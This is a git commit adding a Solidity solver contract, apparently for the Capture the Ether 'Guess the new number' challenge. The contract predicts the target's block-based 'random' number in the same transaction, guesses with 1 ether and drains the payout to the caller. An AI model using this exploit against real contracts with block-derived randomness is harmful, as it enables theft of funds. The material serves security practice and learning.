7af878919b19d9cab4782c069bf22bbf467a45a4
Bohan Zhang <b327zhan@uwaterloo.ca>
2022-05-23 13:47:55 +0800

    Update Guess_the_new_number.sol

--- Guess_the_new_number.sol
+++ Guess_the_new_number.sol
@@ -1,3 +1,4 @@
+// Sol1 https://coinsbench.com/capture-the-ether-guess-the-new-number-fa8df008023c
 pragma solidity ^0.8.0;
 
 interface IGuessTheNewNumberChallenge {
@@ -23,4 +24,33 @@ contract GuessTheNewNumberSolver {
     }
 
     receive() external payable {}
+}
+
+// Sol2
+
+pragma solidity ^0.8.13;
+
+contract Solve {
+    address payable challenge;
+
+    constructor(address payable _c) {
+        challenge = _c;
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+
+    function solveF() public payable{
+        require(msg.value == 1 ether,"money?");
+        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(block.number - 1, block.timestamp))));
+        (bool success, bytes memory data) = challenge.call{value: msg.value}(
+            abi.encodeWithSignature("guess(uint8)", answer)
+        );
+        require(success,"Wrong"); 
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+
 }
